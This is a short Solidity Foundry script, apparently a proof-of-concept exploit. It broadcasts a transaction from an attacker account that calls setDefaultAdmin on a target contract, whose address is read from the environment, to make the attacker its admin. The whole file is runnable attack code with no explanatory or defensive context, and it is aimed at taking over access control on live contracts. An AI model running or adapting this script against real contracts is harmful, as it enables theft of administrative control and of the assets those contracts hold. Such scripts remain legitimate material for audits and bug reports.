// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Script.sol";

contract RunSetDefaultAdminPoC is Script {
    address target;
    address attacker;
    function setUp() public { target = vm.envAddress("TARGET_ADDRESS"); attacker = vm.envOr("ATTACKER", msg.sender); }
    function run() public {
        vm.startBroadcast(attacker);
        (bool success,) = target.call(abi.encodeWithSignature("setDefaultAdmin(address)", attacker));
        if (success) { console.log("setDefaultAdmin succeeded"); } else { console.log("setDefaultAdmin failed"); }
        vm.stopBroadcast();
    }
}
